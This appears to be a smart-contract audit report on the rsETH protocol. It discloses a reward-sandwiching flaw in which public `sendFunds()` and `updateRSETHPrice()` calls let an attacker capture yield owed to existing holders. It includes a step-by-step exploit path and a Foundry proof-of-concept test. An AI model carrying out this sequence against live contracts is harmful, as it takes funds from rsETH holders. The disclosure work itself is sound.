Audit Report

## Title
Reward Sandwiching via Permissionless `FeeReceiver.sendFunds()` and `LRTOracle.updateRSETHPrice()` Allows Theft of Unclaimed Yield from rsETH Holders - (File: contracts/FeeReceiver.sol, contracts/LRTOracle.sol)

## Summary
`FeeReceiver.sendFunds()` carries no access control, and `LRTOracle.updateRSETHPrice()` is a public function callable by anyone. An attacker can deposit ETH at the stale pre-reward `rsETHPrice`, atomically push accumulated MEV rewards into the pool and trigger a price update, then immediately initiate a withdrawal at the inflated post-reward price. After the 8-day delay the attacker exits with a profit equal to their proportional share of the rewards, having contributed no capital during the period those rewards were earned.

## Finding Description
**Root cause — two permissionless state-changing functions:**

`FeeReceiver.sendFunds()` has no role modifier; any address can call it to push the contract's entire ETH balance into `LRTDepositPool`:
```solidity
// contracts/FeeReceiver.sol L53-58
function sendFunds() external {
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
```

`LRTOracle.updateRSETHPrice()` is `public` with only a `whenNotPaused` guard:
```solidity
// contracts/LRTOracle.sol L87-89
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

**Deposit minting uses the stored (lazy) price:**
```solidity
// contracts/LRTDepositPool.sol L519-520
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

**Withdrawal initiation also reads the stored price at call time:**
```solidity
// contracts/LRTWithdrawalManager.sol L593
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
```

**`_calculatePayoutAmount` takes the minimum of the initiation-time locked amount and the unlock-time recalculation:**
```solidity
// contracts/LRTWithdrawalManager.sol L833-834
uint256 currentReturn = (request.rsETHUnstaked * rsETHPrice) / assetPrice;
return (request.expectedAssetAmount < currentReturn) ? request.expectedAssetAmount : currentReturn;
```
This minimum only protects against price *decreases* after initiation; it does not unwind the attacker's advantage of having deposited at the pre-reward price and initiated at the post-reward price.

**`pricePercentageLimit` is insufficient:** The check in `_updateRsETHPrice` (L252-266) reverts non-manager callers only when the price jump exceeds the configured threshold. For normal daily MEV accumulations (e.g., 10 ETH on 10,000 ETH TVL = 0.1%), the increase falls well within a typical 1% daily limit, so the public call succeeds.

**Exploit path:**
1. Attacker calls `LRTDepositPool.depositETH{value: 1000 ETH}()` — minted at stale price 1.0 ETH/rsETH → receives 1000 rsETH.
2. Attacker calls `FeeReceiver.sendFunds()` — 10 ETH pushed to pool; TVL becomes 11,010 ETH, supply 11,000 rsETH.
3. Attacker calls `LRTOracle.updateRSETHPrice()` — stored price updated to ≈1.000909 ETH/rsETH.
4. Attacker calls `LRTWithdrawalManager.initiateWithdrawal(ETH, 1000 rsETH)` — `expectedAssetAmount` locked at ≈1000.909 ETH.
5. After 8 days, attacker calls `completeWithdrawal` — receives ≈1000.909 ETH.
6. **Net profit ≈ 0.909 ETH** (= 1000/11000 × 10 ETH), stolen from the 10,000 pre-existing rsETH holders.

## Impact Explanation
**High — Theft of unclaimed yield.** Existing rsETH holders earn yield through `rsETHPrice` appreciation as MEV/EL rewards accumulate. An attacker who sandwiches a reward recognition event captures a proportional share of those rewards without having been exposed to the protocol during the accrual period. The attack is repeatable every time rewards accumulate in `FeeReceiver`, directly and permanently diluting yield for all honest holders. This matches the allowed impact "High: Theft of unclaimed yield."

## Likelihood Explanation
**Medium.** Prerequisites are: (1) capital to deposit (fully returned after 8 days, so only opportunity cost applies); (2) trivial on-chain monitoring of `FeeReceiver.balance`; (3) calling three permissionless public functions in sequence. The 8-day withdrawal delay is friction but not a deterrent for a well-capitalised attacker. The `pricePercentageLimit` guard does not block the attack for reward sizes that fall within the configured daily threshold, which covers normal protocol operation. The attack is repeatable on every reward cycle.

## Recommendation
1. **Add access control to `FeeReceiver.sendFunds()`** — restrict it to `MANAGER` or `OPERATOR` role so reward distribution cannot be triggered by an arbitrary caller.
2. **Introduce a minimum deposit holding period** — prevent `initiateWithdrawal` from being called within N blocks (e.g., 7–14 days) of the corresponding deposit, eliminating the sandwich window.
3. **Alternatively, stream rewards** — instead of crediting the full reward to `totalETHInProtocol` in a single `updateRSETHPrice()` call, linearly unlock them over a period of time so no single block produces a step-change in price that can be sandwiched.

## Proof of Concept
**Foundry fork test outline:**

```solidity
function test_rewardSandwich() public {
    // 1. Snapshot pre-attack rsETHPrice
    uint256 priceBefore = lrtOracle.rsETHPrice();

    // 2. Attacker deposits 1000 ETH at stale price
    vm.prank(attacker);
    lrtDepositPool.depositETH{value: 1000 ether}(0, "");
    uint256 rsETHReceived = rsETH.balanceOf(attacker);

    // 3. Attacker triggers reward push (no access control)
    vm.prank(attacker);
    feeReceiver.sendFunds(); // pushes accumulated MEV ETH into pool

    // 4. Attacker updates price (public, no role check)
    vm.prank(attacker);
    lrtOracle.updateRSETHPrice();
    uint256 priceAfter = lrtOracle.rsETHPrice();
    assertGt(priceAfter, priceBefore);

    // 5. Attacker initiates withdrawal at inflated price
    vm.prank(attacker);
    rsETH.approve(address(lrtWithdrawalManager), rsETHReceived);
    vm.prank(attacker);
    lrtWithdrawalManager.initiateWithdrawal(ETH_TOKEN, rsETHReceived, "");

    // 6. Advance 8 days, operator unlocks queue
    vm.roll(block.number + 8 days / 12);
    vm.prank(operator);
    lrtWithdrawalManager.unlockQueue(ETH_TOKEN, type(uint256).max, 0, type(uint256).max, 0, type(uint256).max);

    // 7. Attacker completes withdrawal
    uint256 ethBefore = attacker.balance;
    vm.prank(attacker);
    lrtWithdrawalManager.completeWithdrawal(ETH_TOKEN, "");
    uint256 profit = attacker.balance - ethBefore - 1000 ether;

    // profit > 0 proves yield theft
    assertGt(profit, 0);
}
```

The test directly demonstrates that an unprivileged attacker recovers more ETH than deposited, with the difference sourced from rewards that belonged to pre-existing rsETH holders.
